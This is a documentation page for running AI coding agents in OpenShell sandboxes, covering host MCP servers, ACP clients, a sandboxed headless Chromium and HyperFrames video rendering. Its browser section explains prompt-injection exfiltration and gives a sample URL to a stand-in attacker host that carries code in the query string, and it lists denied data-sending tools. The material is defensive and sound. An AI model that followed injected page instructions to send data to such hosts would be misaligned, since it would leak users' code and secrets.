# Extras: MCP servers, ACP, a headless browser and HyperFrames
Optional additions to the basic setup. Each one gives the agent more reach, so add it when a task needs it.

## MCP servers in containers on the host
A sandbox can't run containers, so a stdio MCP server that ships as a container image runs on the host, and the agent uses it over HTTP. OpenShell then sees every request and can filter tools. Over stdio inside the sandbox it can't. The server's secrets also stay in its container.

1. **Run it with an HTTP transport.** Use the server's own HTTP mode if it has one, or put a stdio-to-HTTP bridge such as [supergateway](https://github.com/supercorp-ai/supergateway) in front of it. Bind the port to `127.0.0.1` so only your machine can reach it:
```bash
podman run -d --name my-mcp -p 127.0.0.1:8000:8000 my-mcp-image \
  npx -y supergateway --stdio "my-mcp-server" --outputTransport streamableHttp --port 8000
```
   With an image that only contains the server, build a small image with Node.js and supergateway on top of it.
2. **Find the host's IP in the sandbox** (192.168.127.254 with Podman on macOS):
```bash
openshell sandbox exec my-task -- getent hosts host.containers.internal
```
3. **Add a rule with that IP as `host`** and the tools you allow, then load it with `openshell policy set` (see [Sandbox policies](customizing.md#sandbox-policies)):
```yaml
  host_mcp:
    name: host-mcp
    endpoints:
      - host: 192.168.127.254
        port: 8000
        path: /mcp
        protocol: mcp
        enforcement: enforce
        mcp:
          versions: ["2025-03-26", "2025-06-18", "2025-11-25"]
          allow_all_known_mcp_methods: true
        rules:
          - allow:
              tool: echo           # or e.g. "read_*"; every other tool is denied
    binaries:
      - path: /usr/local/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe
```
4. **Add the server to the agent by IP:** `claude mcp add --transport http my-mcp http://192.168.127.254:8000/mcp`.

* **Use the IP, not `host.containers.internal`.** The name comes from `/etc/hosts` in the sandbox, so a rule with that name never matches (`EACCES`). A URL with the name gets `403 request_authority_mismatch`, because the `Host` header must match the rule.
* **The server runs outside the sandbox.** Its own actions are only limited by its container, so give it only the mounts and tokens it needs.
* **Test:** [tests/host-mcp/run.sh](../tests/host-mcp/run.sh) runs a test server this way and checks that an allowed tool works and another is denied. `--claude` also checks it with Claude Code.

## ACP (Agent Client Protocol)
To build a UI that runs on the host and talks to the agent in the sandbox, use [ACP](https://agentclientprotocol.com). ACP is JSON-RPC over the agent's stdin and stdout, so no port is opened in the sandbox: the client starts the agent through the gateway and speaks ACP over the pipes, like the SSH tunnel for VS Code.
```bash
bin/sandbox.sh opencode my-task --acp
bin/sandbox.sh claude my-task --acp
bin/sandbox.sh agy my-task --acp
```
These run the following, respectively (for OpenCode, plus the model in `OPENCODE_CONFIG_CONTENT`, see below):
```bash
openshell sandbox exec my-task --no-tty --no-login-shell --workdir /sandbox -- opencode acp
openshell sandbox exec my-task --no-tty --no-login-shell --workdir /sandbox -- claude-acp-start
```
* **Client side:** spawn the command above as a subprocess and give its stdin/stdout to an ACP client library (e.g. `@agentclientprotocol/sdk` for TypeScript). Flow: `initialize`, `session/new` (with `cwd` as a path *inside* the sandbox), then `session/prompt`. Keep the process running for the whole session. The agent's stderr is log output; show it separately.
* **Clean stdout:** `--no-tty` stops a pty from mangling the stream, `--no-login-shell` stops profile scripts from printing before the first message. The script prints its own messages (e.g. "Creating sandbox...") to stderr, so create the sandbox once beforehand if your client is strict.
* **Keep the sandbox's isolation:** in `initialize`, don't advertise the `fs` and `terminal` client capabilities. Otherwise the agent may ask your UI to read, write and run commands on the *host*. Without them it uses its own tools inside the sandbox. Handle `session/request_permission` in the UI to approve tool use.
* **OpenCode:** `opencode acp` is built in, so the image needs no changes. It has no `-m` flag, so the script sets the model (`OPENCODE_MODEL`, same default as above) through the `OPENCODE_CONFIG_CONTENT` env var. Without a model, OpenCode picks an `opencode/...` one and fails with "Cannot connect to API", because `opencode.ai` is blocked.
* **Claude Code:** has no native ACP mode, so the image includes the adapter [`@agentclientprotocol/claude-agent-acp`](https://www.npmjs.com/package/@agentclientprotocol/claude-agent-acp). `--acp` runs `claude-acp-start`, which skips onboarding (like `claude-start`) and starts `claude-agent-acp`. The adapter runs Claude Code through the Claude Agent SDK, which by default uses its own bundled `claude` binary deep in the adapter's `node_modules`. That path is not in the profile's `binaries`, so its requests would go out without the token. The image sets `CLAUDE_CODE_EXECUTABLE` to the globally installed `claude.exe` instead, which the profile already allows. Rebuild the image and create a new sandbox after updating; existing sandboxes keep the old image.
* **Antigravity CLI:** `agy` has no ACP mode, so the image includes the community adapter [`google-antigravity-acp`](https://github.com/sibbl/google-antigravity-acp) (Node.js, pinned in the Dockerfile). `--acp` runs `agy-acp-start`, which starts it with `/usr/local/bin/agy`, the binary the policy lets reach Google. Log in once first (`bin/sandbox.sh agy my-task`); without a login the session fails with "agy process exited before emitting init event". The adapter has no `loadSession`, and auto-approves tool permissions unless `AGY_ACP_ASK=1`.
* **Network:** egress rules are unchanged; ACP doesn't open anything.
* **Fallback:** if the gRPC exec stream misbehaves, use the SSH route (see [By hand](working-in-sandboxes.md#by-hand)): `ssh openshell-my-task.default opencode acp` or `... claude-acp-start` (add `-T` to disable the pty).
* **Example client:** [bin/acp_client.py](../bin/acp_client.py) is a minimal client (Python 3, no dependencies) that lists sandboxes and chats with the agent in one:
```bash
bin/acp_client.py list
bin/acp_client.py connect <sandbox> [--agent opencode|claude|agy] [--model M] [--cwd /sandbox]
```
  Type a prompt and press Enter; `/help` lists the commands, `/models [FILTER]` lists the models the agent offers, `/model ID` switches model for the session, `/commands` lists the agent's own slash commands (e.g. `/init`, `/review`), `/quit` or Ctrl-D exits, and Ctrl-C cancels a running prompt. It checks that the sandbox exists and is `Ready`, prints the agent's text and tool calls, asks permission requests on the terminal, and refuses any `fs/*` or `terminal/*` request from the agent. If the agent fails or exits, it shows the agent's last output with a hint (missing adapter, blocked API host, wrong model). Options: `--timeout SEC` for startup, `-v` for the JSON-RPC traffic and the agent's stderr. Exit codes: 0 ok, 1 agent error, 2 bad usage or sandbox. Without `--agent`, it picks the agent by which ACP command the sandbox has (`claude-acp-start`, `agy-acp-start` or `opencode`). Use it as a starting point for your UI.
* **Test it** before building the UI: `printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":1,"clientCapabilities":{}}}' | bin/sandbox.sh opencode my-task --acp` (or `claude` instead of `opencode`) should print one JSON response.

## Headless browser use
Claude Code can use a headless Chromium that runs **inside the sandbox**, through [Playwright MCP](https://github.com/microsoft/playwright-mcp). Because the browser runs in the sandbox, OpenShell's network rules decide which sites it may reach, the same way as for any other program. The browser starts with an empty profile in memory, so it has none of your cookies or logins.

### Why in the sandbox
* **The risk is data going out, not only bad pages coming in.** Every page load can carry data in its URL (`https://evil.example/?d=<your code>`). A page the agent reads can tell it to do exactly that (prompt injection), and allowing only GET requests doesn't stop it. The one control that works is the list of hosts the browser may reach.
* **Not your own Chrome** (Claude in Chrome, or the agent attached to your Chrome over CDP). The agent would act with all your logins, outside the sandbox.
* **Not Playwright MCP on the host**, like the [MCP servers on the host](#mcp-servers-in-containers-on-the-host). A `protocol: mcp` rule can filter tool names, but it doesn't check arguments, so it can't check URLs. The browser's own traffic would also bypass OpenShell. Playwright's `--allowed-origins` option is documented as *not* a security boundary.

### Set it up
1. **Build the image** on top of `claude-sandbox` (build that one first, see [Build the image](agents.md#build-the-image)):
```bash
podman build -t claude-browser:latest images/claude-browser
```
   Or `make claude-browser`, which builds both.
2. **List the sites** the browser may open under `browser_sites` in [policies/browser.yaml](../policies/browser.yaml). It allows only `example.com` as a placeholder:
```yaml
  browser_sites:
    name: browser-sites
    endpoints:
      - host: docs.python.org      # the sites for your task
        port: 443
    binaries:
      - path: /opt/ms-playwright/**   # only Chromium gets this rule
```
3. **Create the sandbox** with the script, or by hand:
```bash
bin/sandbox.sh claude web-task --browser

openshell sandbox create --name web-task --from claude-browser:latest --provider claude \
  --policy policies/browser.yaml --detach -- sleep infinity
openshell sandbox exec web-task --workdir /sandbox -- claude-start
```
4. **Ask Claude** to use the browser, e.g. "open http://localhost:3000 and check the login form". `/mcp` in Claude shows the `playwright` server.

### What the image adds
[images/claude-browser](../images/claude-browser) builds on `claude-sandbox`. Its [Dockerfile](../images/claude-browser/Dockerfile) copies in the files from that folder:
* **Playwright MCP and headless Chromium** in `/opt/ms-playwright`. The path is fixed and read-only in the sandbox, so the rule can name the Chromium binary (`/opt/ms-playwright/**`) and the agent can't replace it.
* **The `playwright` MCP server in Claude Code.** `claude-start` copies `/etc/claude-start.json` to `~/.claude.json` on first start. The base image's file only skips onboarding; this image's file also registers the server.
* **`playwright-mcp-start`** starts the server. OpenShell decrypts HTTPS with a CA it creates for each sandbox. Programs trust it through `SSL_CERT_FILE` and similar variables, but Chromium only trusts its own NSS database. Without it, every HTTPS page fails with `ERR_CERT_AUTHORITY_INVALID`, so the script adds the CA there on every start.
* **`/etc/playwright-mcp.json`**: headless, profile in memory only, Chromium's own sandbox off, and `--no-zygote`. OpenShell's syscall filter makes Chromium's zygote process crash (`Target crashed`) even with its sandbox off. The OpenShell sandbox is the boundary.
* **Denied tools**, in managed settings (`/etc/claude-code/managed-settings.json`, which the agent can't change): `browser_run_code_unsafe` (runs any code in the MCP server) and `browser_file_upload` (sends local files to a site). Claude Code then doesn't offer these tools at all. This is extra caution, not the boundary: the agent can run code with Bash anyway, and the network rules limit where anything can go.

### Allowing sites
* **Pages on the sandbox itself** (a dev server on `localhost` or `127.0.0.1`) work without a rule. This is the safest use: testing what the agent builds needs no outside access.
* **Any other site** must be in `browser_sites`, or it fails with `net::ERR_NETWORK_ACCESS_DENIED`. Change the list on a running sandbox with `openshell policy set web-task --policy policies/browser.yaml --wait`, or approve the proposed rules for the Chromium binary (see [Network rules](customizing.md#network-rules)).
* **What a page loads from other hosts** (CDNs, fonts, APIs) is denied too. The page may still be usable. If not, check `openshell logs web-task | grep DENIED` and add the hosts it needs.
* **List only sites you trust with what the agent can see.** Each allowed site can receive data. Big sites with user content (GitHub, pastebins, any site where people post) are where a manipulated agent could send it.
* Chromium tries `www.google.com` and `update.googleapis.com` at start. Those show up as DENIED in the logs. That's harmless, so leave them blocked.

### Things to watch for
* **Claude Code only.** The OpenCode image is Alpine-based, and Playwright's Chromium doesn't run on Alpine.
* **The agent can change its own MCP config** in `~/.claude.json`, e.g. remove the in-memory profile. That doesn't weaken the network and filesystem limits, which OpenShell enforces outside the agent.
* **Page content is untrusted input** for the agent, like files it downloads. Keep secrets out of browser sandboxes.
* **Size and memory:** the image is about 1.9 GB, and Chromium needs memory. Give the Podman machine more if you run several (see [Many sandboxes in parallel](working-in-sandboxes.md#many-sandboxes-in-parallel)).
* **Existing sandboxes** keep their old image. Create a new one after rebuilding.
* **Test:** [tests/browser/run.sh](../tests/browser/run.sh) creates a sandbox and checks that an allowed site loads, a site not in the list is denied, and a local server on `127.0.0.1` and `localhost` loads. `--claude` also checks it with Claude Code.

## HyperFrames
[HyperFrames](https://hyperframes.heygen.com) makes videos from HTML: the agent writes a composition (HTML, CSS and GSAP), HyperFrames previews it in a web studio and renders it to MP4 with headless Chrome and FFmpeg. The `claude-hyperframes` image has all of it, plus the HyperFrames skills for Claude Code. You watch and edit in the HyperFrames Studio from your own browser, through a forwarded port.

### Set it up
1. **Build the image.** It builds on `claude-browser`, which builds on `claude-sandbox`; `make` builds all three in order:
```bash
make claude-hyperframes
```
   Or by hand:
```bash
podman build -t claude-sandbox:latest     images/claude-sandbox
podman build -t claude-browser:latest     images/claude-browser
podman build -t claude-hyperframes:latest images/claude-hyperframes
```
2. **Create the sandbox and forward the preview port.** `--hyperframes` uses the image and [policies/hyperframes.yaml](../policies/hyperframes.yaml), `--forward` starts the port forward in the background:
```bash
bin/sandbox.sh claude my-video --hyperframes --forward 3102
```
3. **Ask Claude for a video**, and to serve the preview on that port, e.g. "Make a 10-second launch video for our CLI in /sandbox/launch. When it passes `hyperframes check`, start the preview with `npx hyperframes preview --background --no-open --port 3102`."
4. **Open http://127.0.0.1:3102** on your machine. This is HyperFrames Studio: play, scrub, edit, and see the agent's changes as it works.
5. **Get the video out** when it's rendered (`npx hyperframes render`, by default to `renders/` in the project):
```bash
openshell sandbox download my-video /sandbox/launch/renders/launch.mp4 .
```

By hand, without the script:
```bash
openshell sandbox create --name my-video --from claude-hyperframes:latest --provider claude \
  --policy policies/hyperframes.yaml --detach -- sleep infinity
openshell forward start 3102 my-video -d
openshell sandbox exec my-video --workdir /sandbox -- claude-start
```

### What the image adds
[images/claude-hyperframes](../images/claude-hyperframes) builds on `claude-browser` (Playwright MCP and headless Chromium, see [What the image adds](#what-the-image-adds) above), so Claude can also open the preview itself and take screenshots. On top of that:
* **The HyperFrames CLI** (npm `hyperframes`, pinned with `ARG HYPERFRAMES_VERSION`), **FFmpeg**, and fonts (Liberation, Noto including CJK and emoji) for rendering.
* **The HyperFrames skills** of the same release (`hyperframes`, `hyperframes-core`, `hyperframes-cli`, `general-video`, `media-use` and the rest), copied to `~/.claude/skills` on first start. They aren't installed as a plugin, so Claude doesn't try to update them from GitHub.
* **Rendering with Playwright's headless Chromium** (`HYPERFRAMES_BROWSER_PATH`). HyperFrames normally downloads its own Chrome, which the sandbox can't.
* **`hyperframes-init`**, run by `claude-start` and `claude-acp-start`: copies the skills, and adds the OpenShell CA to Chromium's certificate store. Without the CA, every CDN load in a render or `check` fails with `ERR_CERT_AUTHORITY_INVALID`, GSAP never loads, and videos come out still.
* **A patch for one HyperFrames call.** The render worker lowers its own process priority, which OpenShell's syscall filter doesn't allow, so every render failed with `uv_os_setpriority returned EPERM`. The image makes that call best-effort. If a new HyperFrames version changes that code, the build fails at that step, so the patch gets checked.
* **Quiet by default:** no telemetry (`HYPERFRAMES_NO_TELEMETRY`, `DO_NOT_TRACK`), no update checks, no skill downloads on `init` (`HYPERFRAMES_SKIP_SKILLS`).

### The policy
[policies/hyperframes.yaml](../policies/hyperframes.yaml) has the browser policy's filesystem rules and allows, read-only (GET):
* **For Chromium:** `cdn.jsdelivr.net`, `unpkg.com`, `cdnjs.cloudflare.com`, `fonts.googleapis.com`, `fonts.gstatic.com`. Compositions load GSAP and other libraries and fonts from these.
* **For the CLI (node):** the same font and jsDelivr hosts, `hyperframes.heygen.com` (docs and schemas), and `raw.githubusercontent.com`, but only paths under `/heygen-com/hyperframes/` (the block registry for `hyperframes add` and `catalog`).

The preview on `127.0.0.1` in the sandbox needs no rule. A composition that loads something else (an image from a website, another CDN) shows it as DENIED in `openshell logs my-video`. Add the host and apply it to the running sandbox with `openshell policy set my-video --policy policies/hyperframes.yaml --wait`.

### With Antigravity CLI
`bin/sandbox.sh agy my-video --hyperframes --forward 3102` does the same with `agy` instead of Claude Code, using the `agy-hyperframes` image (built on `claude-hyperframes`, plus `agy`, the ACP adapter and Python 3) and [policies/agy-hyperframes.yaml](../policies/agy-hyperframes.yaml). The skills are still copied to `~/.claude/skills`, where `agy` doesn't look for them. Because `agy`'s login tokens sit in the sandbox, read the warning in [agents.md](agents.md#antigravity-cli-with-a-google-account) first.

### Things to watch for
* **Port in use on your machine:** `openshell forward` uses the same port number on both sides, and `--forward` fails if the port is taken (`lsof -i :3102`). HyperFrames' default preview port 3002 is often in use if you also run HyperFrames on the host, so pick another, as above.
* **The Studio runs the agent's code in your browser**, outside the sandbox. See [Viewing a web page from the sandbox](working-in-sandboxes.md#viewing-a-web-page-from-the-sandbox). Use a private window.
* **`hyperframes catalog` stalls in the sandbox.** It fetches hundreds of registry files from `raw.githubusercontent.com`. OpenShell maps each allowed host to a short-lived internal address, and Node keeps reusing connections after that mapping expires, so they're denied (`transparent TCP mapping is expired` in `openshell logs`) and the command hangs. While it runs, other HyperFrames commands in the sandbox may hang too, so stop it. `hyperframes add <name>` works, so browse the catalog at [hyperframes.heygen.com](https://hyperframes.heygen.com) and tell the agent which block to add.
* **Not included:** local transcription (whisper.cpp), local voice (Kokoro) and music (MusicGen) models, and HeyGen's cloud features (avatars, TTS, cloud rendering), which need a HeyGen API key and `api.heygen.com`. `npx hyperframes doctor` lists what's missing; Docker, `/dev/shm` size and these optional models show as failed and don't matter for rendering.
* **Rendering uses software GL**, so it's slower than on a Mac with a GPU: about 1.5 s of render time per second of video for a simple composition.
* **`npx` contacts registry.npmjs.org** once, which shows as DENIED. HyperFrames is installed globally, so it works anyway.
* **Size:** the image adds about 0.5 GB to `claude-browser` (2.3 GB in all).
* **Test:** [tests/hyperframes/run.sh](../tests/hyperframes/run.sh) creates a sandbox, renders a project, checks that `hyperframes check` loads GSAP without errors, and that the preview is reachable from your machine through a forwarded port. `--claude` also has Claude Code make and render a short video.
